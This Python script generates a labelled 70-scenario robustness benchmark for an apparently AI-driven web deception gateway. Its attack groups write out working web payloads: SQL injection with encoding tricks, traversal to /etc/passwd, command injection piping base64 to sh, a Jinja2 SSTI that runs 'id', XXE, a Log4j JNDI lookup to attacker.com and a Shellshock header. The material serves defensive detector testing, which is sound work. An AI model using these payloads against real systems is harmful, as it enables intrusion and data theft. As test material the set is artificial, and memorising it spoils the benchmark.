#!/usr/bin/env python3
"""
Adversarial Robustness Scenario Dataset Generator
AI-Enabled Adaptive Cyber Deception Gateway — Stage 10

Generates a standardized, versioned 70-scenario adversarial robustness test set:
  1. Benign Requests with Suspicious-Looking Strings (16 scenarios) — False Positive Probes
  2. Evasion & Obfuscated Attack Payloads (20 scenarios) — False Negative Probes
  3. Unseen Payload Templates & Injection Variants (12 scenarios) — Generalization Probes
  4. Boundary Cases & Structural Variations (12 scenarios) — Threshold Sensitivity Probes
  5. Malformed Requests & Safety Edge Cases (10 scenarios) — Input Sanitization & Fault Tolerance Probes

All scenarios feature independently assigned ground truth and strict isolation.
"""

import os
import json
import hashlib
from typing import Dict, List, Any


def create_scenario(
    scenario_id: str,
    category: str,
    is_attack: bool,
    method: str,
    path: str,
    body: str = "",
    headers: Dict[str, str] = None,
    client_ip: str = "198.51.100.50",
    auth_failure_count: int = 0,
    request_frequency: float = 1.0,
    decoy_interactions: int = 0,
    expected_safety_constraint: str = "MUST_REACH_ORIGIN",
    description: str = "",
) -> Dict[str, Any]:
    if headers is None:
        headers = {
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "host": "localhost:8080",
        }

    return {
        "scenario_id": scenario_id,
        "split": "adversarial_robustness",
        "session_id": f"sess_{scenario_id.lower().replace('-', '_')}",
        "description": description,
        "ground_truth": {
            "label": "MALICIOUS" if is_attack else "BENIGN",
            "is_attack": is_attack,
            "category": category,
            "expected_safety_constraint": expected_safety_constraint,
        },
        "request": {
            "method": method,
            "path": path,
            "headers": headers,
            "body": body,
            "client_ip": client_ip,
        },
        "context_features": {
            "auth_failure_count": auth_failure_count,
            "request_frequency": request_frequency,
            "decoy_interactions": decoy_interactions,
        },
    }


def build_robustness_dataset() -> Dict[str, Any]:
    scenarios: List[Dict[str, Any]] = []

    # =========================================================================
    # Group 1: Benign Requests with Suspicious-Looking Strings (16 scenarios)
    # Tests whether benign traffic containing tokens like 'admin', 'union', 'exec',
    # 'select', 'cmd', or 'root' is falsely diverted (False Positive risk).
    # =========================================================================
    benign_suspicious = [
        ("GET", "/api/search?q=how+to+use+sql+union+in+queries", "", "Search query for SQL tutorial"),
        ("GET", "/api/search?q=admin+guide+configuration", "", "Search query for admin documentation"),
        ("GET", "/api/search?q=select+items+from+catalog", "", "Search query with select keyword"),
        ("GET", "/api/help/articles/admin-password-reset", "", "Documentation for admin password reset"),
        ("GET", "/api/blog/posts/understanding-sql-injection-prevention", "", "Blog post discussing SQL injection"),
        ("GET", "/api/users/profile/select-avatar", "", "User settings endpoint with 'select' in path"),
        ("GET", "/assets/admin-dashboard-preview.png", "", "Static preview asset with 'admin' in filename"),
        ("GET", "/api/feedback?topic=exec-leadership", "", "Customer feedback with 'exec' token"),
        ("GET", "/api/catalog?order=desc&filter=eval-ready", "", "Catalog filter with 'eval' substring"),
        ("GET", "/api/items?category=root-vegetables", "", "Product category containing 'root'"),
        ("POST", "/api/support/message", '{"subject":"admin help","body":"How do I contact the administrator?"}', "Support message asking about admin"),
        ("GET", "/api/docs/bash-shell-scripting-basics", "", "Documentation mentioning shell"),
        ("GET", "/api/catalog?name=php-programming-handbook", "", "Catalog search for PHP book"),
        ("GET", "/api/system/time", "", "System endpoint for time synchronization"),
        ("GET", "/api/users/administrator-notes", "", "Public bio notes for administrator role"),
        ("GET", "/api/catalog?query=shadow-of-the-colossus", "", "Video game title containing 'shadow'"),
    ]

    for i, (m, p, b, desc) in enumerate(benign_suspicious):
        scenarios.append(create_scenario(
            scenario_id=f"ROB-BEN-SUSP-{i+1:03d}",
            category="BENIGN_SUSPICIOUS_TOKENS",
            is_attack=False,
            method=m,
            path=p,
            body=b,
            client_ip=f"192.168.10.{i+1}",
            auth_failure_count=0,
            request_frequency=1.2,
            expected_safety_constraint="MUST_REACH_ORIGIN",
            description=desc,
        ))

    # =========================================================================
    # Group 2: Evasion & Obfuscated Attack Payloads (20 scenarios)
    # Tests whether harmless structural transformations, inline comments, case
    # variations, and encoding tricks evade detection (False Negative risk).
    # =========================================================================
    evasion_attacks = [
        # SQLi with inline SQL comments
        ("GET", "/api/catalog?id=1%27/**/OR/**/1=1--", "", "SQLI", "SQLi with SQL inline comments bypassing space regex"),
        # SQLi with mixed casing
        ("GET", "/api/items?search=%27/**/uNiOn/**/sElEcT/**/username,password/**/fRoM/**/users--", "", "SQLI", "SQLi with mixed case tokens"),
        # SQLi with URL double-encoding
        ("GET", "/api/search?query=%2527%2520OR%25201%253D1--", "", "SQLI", "SQLi with double URL-encoded single quote"),
        # SQLi with tab separators
        ("GET", "/api/products?id=1%09OR%091=1", "", "SQLI", "SQLi with horizontal tab characters as separators"),
        # SQLi with line breaks
        ("GET", "/api/data?q=1%0AUNION%0ASELECT%0ANULL", "", "SQLI", "SQLi with newline separators"),
        # Path traversal with double URL encoding (%252e%252e%252f)
        ("GET", "/view?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "", "TRAVERSAL", "Path traversal with double-encoded dots and slashes"),
        # Path traversal with nested dot-slash (....//)
        ("GET", "/api/files?path=....//....//etc/passwd", "", "TRAVERSAL", "Path traversal with nested slash filter evasion"),
        # Path traversal with backslash encoding (%255c)
        ("GET", "/api/doc?name=..%255c..%255cwindows%255cwin.ini", "", "TRAVERSAL", "Windows traversal with double-encoded backslashes"),
        # Path traversal with dot-slash mix (./../../)
        ("GET", "/api/images?path=./../../app/config.json", "", "TRAVERSAL", "Path traversal starting with relative dot-slash"),
        # Path traversal with null-byte bypass attempt
        ("GET", "/api/logs?file=../../../../etc/passwd%00.png", "", "TRAVERSAL", "Path traversal with null-byte termination probe"),
        # Command injection with $IFS environment variable
        ("GET", "/api/network/lookup?domain=google.com;cat$IFS/etc/passwd", "", "CMDI", "CMDi using $IFS shell internal field separator"),
        # Command injection with subshell expansion and curly braces
        ("GET", "/api/tools/dig?target=8.8.8.8%3B%7Bcat%2C%2Fetc%2Fpasswd%7D", "", "CMDI", "CMDi using bash brace expansion without spaces"),
        # Command injection with base64 pipe
        ("GET", "/api/exec?cmd=echo%20aWQ=|base64%20-d|sh", "", "CMDI", "CMDi piping base64-decoded command to shell"),
        # Command injection with newline separator
        ("GET", "/api/ping?host=127.0.0.1%0Aid", "", "CMDI", "CMDi using URL-encoded newline separator %0A"),
        # Reconnaissance with mixed-case path
        ("GET", "/Wp-AdMiN/setup-config.php", "", "RECON", "Reconnaissance probe with mixed-case path"),
        # Reconnaissance with dot-segment prefix
        ("GET", "/./.env", "", "RECON", "Reconnaissance probe with relative dot segment"),
        # Reconnaissance with single-dot encoding
        ("GET", "/%2eenv", "", "RECON", "Reconnaissance probe with URL-encoded leading dot"),
        # Reconnaissance with path parameter suffix
        ("GET", "/actuator/env;param=value", "", "RECON", "Reconnaissance probe with path parameter matrix suffix"),
        # Credential stuffing with low frequency (1.5 req/s, 2 auth failures)
        ("POST", "/api/auth/login", '{"username":"root","password":"123"}', "CRED_STUFF", "Credential stuffing below standard high-frequency threshold"),
        # Credential stuffing with rotated IP (single attempt per IP)
        ("POST", "/api/auth/login", '{"username":"admin","password":"password1"}', "CRED_STUFF", "Credential stuffing attempt from distributed botnet IP"),
    ]

    for i, item in enumerate(evasion_attacks):
        m, p, b, cat, desc = item
        scenarios.append(create_scenario(
            scenario_id=f"ROB-EVAS-{i+1:03d}",
            category=cat,
            is_attack=True,
            method=m,
            path=p,
            body=b,
            client_ip=f"198.51.100.{20 + i}",
            auth_failure_count=2 if cat == "CRED_STUFF" else 0,
            request_frequency=1.5 if cat == "CRED_STUFF" else 2.5,
            expected_safety_constraint="ZERO_ORIGIN_LEAKAGE",
            description=desc,
        ))

    # =========================================================================
    # Group 3: Unseen Payload Templates & Injection Variants (12 scenarios)
    # Tests model generalization against injection classes outside the Stage 9 baseline.
    # =========================================================================
    unseen_templates = [
        # Server-Side Template Injection (SSTI)
        ("GET", "/api/render?template=%7B%7B7*7%7D%7D", "", "SSTI", "Server-Side Template Injection expression probe"),
        ("GET", "/api/render?template=%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%7D%7D", "", "SSTI", "SSTI Jinja2 Python execution payload"),
        # NoSQL Injection ($ne / $gt)
        ("GET", "/api/users?user%5B%24ne%5D=null", "", "NOSQLI", "NoSQL injection using $ne not-equal query operator"),
        ("POST", "/api/catalog", '{"$where": "sleep(5000)"}', "NOSQLI", "NoSQL injection using MongoDB $where JavaScript evaluation"),
        # XML External Entity (XXE) Injection
        ("POST", "/api/xml/upload", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "XXE", "XXE injection probe targeting /etc/passwd"),
        # LDAP Injection
        ("GET", "/api/users?filter=%28%26%28uid%3D%2A%29%28userPassword%3D%2A%29%29", "", "LDAP_INJECTION", "LDAP wildcard attribute extraction injection"),
        # Log4j JNDI Lookup Probe
        ("GET", "/api/search?q=%24%7Bjndi%3Armi%3A%2F%2Fattacker.com%2Fa%7D", "", "LOG4J_JNDI", "Log4j JNDI remote lookup probe"),
        # Header-based SQLi (in Referer header)
        ("GET", "/api/items", "", "SQLI_HEADER", "SQL injection carried in HTTP Referer header"),
        # Header-based Shellshock (in User-Agent header)
        ("GET", "/api/status", "", "CMDI_HEADER", "Shellshock command injection payload in User-Agent header"),
        # Cross-Site Scripting (Reflected XSS)
        ("GET", "/api/search?q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E", "", "XSS", "Reflected cross-site scripting payload probe"),
        # GraphQL Introspection Probe
        ("POST", "/graphql", '{"query":"{__schema{types{name}}}"}', "GRAPHQL_PROBE", "GraphQL schema introspection query harvesting internal types"),
        # WebDAV Method Probe
        ("PROPFIND", "/api/files", "", "WEBDAV_PROBE", "Unauthorized WebDAV PROPFIND reconnaissance scan"),
    ]

    for i, item in enumerate(unseen_templates):
        m, p, b, cat, desc = item
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "accept": "application/json",
            "host": "localhost:8080",
        }
        if cat == "SQLI_HEADER":
            headers["referer"] = "http://localhost:8080/api/items?id=1' OR '1'='1"
        elif cat == "CMDI_HEADER":
            headers["user-agent"] = "() { :;}; /bin/sleep 5"

        scenarios.append(create_scenario(
            scenario_id=f"ROB-UNSEEN-{i+1:03d}",
            category=cat,
            is_attack=True,
            method=m,
            path=p,
            body=b,
            headers=headers,
            client_ip=f"198.51.100.{50 + i}",
            auth_failure_count=0,
            request_frequency=2.0,
            expected_safety_constraint="ZERO_ORIGIN_LEAKAGE",
            description=desc,
        ))

    # =========================================================================
    # Group 4: Boundary Cases & Structural Variations (12 scenarios)
    # Tests edge-of-distribution traffic, legitimate high-entropy tokens, and threshold limits.
    # =========================================================================
    boundary_cases = [
        # Benign high-entropy MD5 asset
        ("GET", "/api/files/download/d41d8cd98f00b204e9800998ecf8427e", False, "BENIGN", "High-entropy MD5 filename in benign asset download"),
        # Benign JWT verification URL
        ("GET", "/api/verify?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.signature", False, "BENIGN", "Benign verification URL with high query entropy"),
        # Reordered query params
        ("GET", "/api/catalog?sort=desc&limit=10&page=1&category=books", False, "BENIGN", "Normal catalog query with reordered parameters"),
        # Empty query string
        ("GET", "/api/catalog?", False, "BENIGN", "Catalog request with trailing empty query string"),
        # Trailing slash
        ("GET", "/api/catalog/", False, "BENIGN", "Legitimate endpoint with trailing slash"),
        # Preflight OPTIONS
        ("OPTIONS", "/api/catalog", False, "BENIGN", "CORS preflight request with OPTIONS method"),
        # HEAD request
        ("HEAD", "/api/catalog", False, "BENIGN", "Cache validation request with HEAD method"),
        # Moderate frequency request (8.5 req/s) — should be OBSERVE_ONLY
        ("GET", "/api/catalog?q=test", False, "BENIGN", "Elevated request frequency below attack threshold"),
        # Clean request with 15 corporate headers
        ("GET", "/api/users/profile", False, "BENIGN", "Legitimate corporate request with high header count"),
        # Borderline probe: 1 keyword without exploit signature
        ("GET", "/api/users/admin-contact", False, "BENIGN", "Single keyword in legitimate user contact path"),
        # Borderline attack: single auth failure with normal frequency
        ("POST", "/api/auth/login", False, "BENIGN", "Single isolated user password typo"),
        # Mild scanner user-agent on benign page (should be SUSPICIOUS, not immediately malicious)
        ("GET", "/api/catalog", False, "BENIGN", "Benign request with curl user-agent"),
    ]

    for i, item in enumerate(boundary_cases):
        m, p, is_atk, cat, desc = item
        headers = {
            "user-agent": "curl/7.88.1" if "curl" in desc else "Mozilla/5.0",
            "accept": "*/*",
            "host": "localhost:8080",
        }
        if "15 corporate headers" in desc:
            for h in range(12):
                headers[f"x-corporate-header-{h}"] = f"val-{h}"

        scenarios.append(create_scenario(
            scenario_id=f"ROB-BOUND-{i+1:03d}",
            category=cat,
            is_attack=is_atk,
            method=m,
            path=p,
            headers=headers,
            client_ip=f"192.168.20.{i+1}",
            auth_failure_count=1 if "password typo" in desc else 0,
            request_frequency=8.5 if "Elevated request frequency" in desc else 1.0,
            expected_safety_constraint="MUST_REACH_ORIGIN",
            description=desc,
        ))

    # =========================================================================
    # Group 5: Malformed Requests & Safety Edge Cases (10 scenarios)
    # Tests that abnormal or malformed requests fail safely without crashes or policy bypass.
    # =========================================================================
    malformed_cases = [
        # Malformed URI percent encoding
        ("GET", "/api/search?q=%ZZ%FF", False, "MALFORMED", "Malformed invalid percent encoding in query string"),
        # Oversized path (3000 chars)
        ("GET", "/api/" + "a" * 3000, False, "MALFORMED", "Oversized URL path exceeding normal buffer limits"),
        # Null byte in path
        ("GET", "/api/files/test%00.txt", False, "MALFORMED", "Null byte character in URL path"),
        # Non-ASCII unicode in path
        ("GET", "/api/search?q=caf%C3%A9_r%C3%A9sum%C3%A9", False, "BENIGN", "Valid UTF-8 accented characters in search query"),
        # Double slash in path
        ("GET", "//api//catalog", False, "BENIGN", "Path with double slashes (normalization edge case)"),
        # Relative dot segment
        ("GET", "/./api/catalog", False, "BENIGN", "Path with single-dot relative segment"),
        # Missing host header
        ("GET", "/api/catalog", False, "MALFORMED", "HTTP request missing mandatory Host header"),
        # Unknown HTTP verb
        ("FOOBAR", "/api/catalog", False, "MALFORMED", "Non-standard HTTP method"),
        # Trailing null bytes in query
        ("GET", "/api/catalog?id=1%00", True, "MALFORMED_ATTACK", "Query containing null-byte injection"),
        # Extremely deep path
        ("GET", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t", False, "MALFORMED", "Path with 20 directory nesting levels"),
    ]

    for i, item in enumerate(malformed_cases):
        m, p, is_atk, cat, desc = item
        headers = {
            "user-agent": "Mozilla/5.0",
            "accept": "*/*",
        }
        if "missing mandatory Host" not in desc:
            headers["host"] = "localhost:8080"

        scenarios.append(create_scenario(
            scenario_id=f"ROB-MALF-{i+1:03d}",
            category=cat,
            is_attack=is_atk,
            method=m,
            path=p,
            headers=headers,
            client_ip=f"192.168.30.{i+1}",
            auth_failure_count=0,
            request_frequency=1.0,
            expected_safety_constraint="MUST_REACH_ORIGIN" if not is_atk else "ZERO_ORIGIN_LEAKAGE",
            description=desc,
        ))

    # Calculate digest over all scenarios
    content_str = json.dumps(scenarios, sort_keys=True)
    content_hash = hashlib.sha256(content_str.encode("utf-8")).hexdigest()

    dataset_obj = {
        "dataset_version": "1.0.0",
        "dataset_name": "Stage 10 Adversarial Robustness Benchmark Scenarios",
        "description": "70 controlled robustness variants: false positive probes, obfuscated evasion, unseen templates, boundary cases, and malformed inputs.",
        "schema_version": "2.0.0",
        "total_scenarios": len(scenarios),
        "split": "adversarial_robustness",
        "group_summary": {
            "benign_suspicious_tokens": len(benign_suspicious),
            "evasion_attacks": len(evasion_attacks),
            "unseen_templates": len(unseen_templates),
            "boundary_cases": len(boundary_cases),
            "malformed_cases": len(malformed_cases),
        },
        "ground_truth_summary": {
            "total_benign": sum(1 for s in scenarios if not s["ground_truth"]["is_attack"]),
            "total_attacks": sum(1 for s in scenarios if s["ground_truth"]["is_attack"]),
        },
        "content_sha256": content_hash,
        "scenarios": scenarios,
    }

    return dataset_obj


def main():
    dataset = build_robustness_dataset()
    out_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "scenarios")
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "robustness_scenarios_v1.json")

    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(dataset, f, indent=2)

    print(f"[OK] Generated {dataset['total_scenarios']} robustness scenarios to: {out_file}")
    print(f"     Content SHA-256: {dataset['content_sha256']}")
    print(f"     Benign samples: {dataset['ground_truth_summary']['total_benign']}")
    print(f"     Attack samples: {dataset['ground_truth_summary']['total_attacks']}")


if __name__ == "__main__":
    main()
